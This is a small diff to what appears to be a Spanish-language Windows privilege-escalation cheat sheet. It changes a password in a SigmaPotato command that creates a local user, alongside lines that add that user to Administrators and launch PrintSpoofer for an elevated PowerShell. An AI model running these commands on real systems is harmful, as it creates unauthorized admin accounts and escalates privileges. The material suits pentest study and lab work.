@@ -133,7 +133,7 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 - Nos permite escalar privilegios con Printspoofer, sigma potato
 	```powershell
 	# sigmapotato
-	.\sigmapotato.exe "net user an0nio 1234 /add"	
+	.\sigmapotato.exe "net user an0nio Password123 /add"	
 	.\sigmapotato.exe "net localgroup Administrators an0nio /add "
 	# printspoofer
 	.\PrintSpoofer.exe -i -c "powershell"
